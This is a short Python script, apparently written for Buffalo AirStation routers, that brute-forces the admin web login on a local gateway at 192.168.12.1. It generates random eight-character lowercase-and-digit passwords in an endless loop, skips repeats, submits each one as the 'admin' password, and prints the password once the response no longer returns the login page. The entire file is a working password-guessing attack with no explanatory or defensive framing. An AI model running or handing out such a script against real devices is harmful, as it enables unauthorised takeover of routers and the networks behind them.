import AirStationCli.AirStationAPI as AirStationAPI
import random, string

airstation = AirStationAPI.AirStationAPI(default_gateway="192.168.12.1")


rand_history = []
while True:
    rand = "".join(
        random.choice(string.ascii_lowercase + string.digits) for i in range(8)
    )
    if rand in rand_history:
        continue
    rand_history.append(rand)
    print(len(rand_history))
    res = airstation.login_get().login_post("admin", rand)
    if "login.html" not in res:
        print(rand)
        exit()
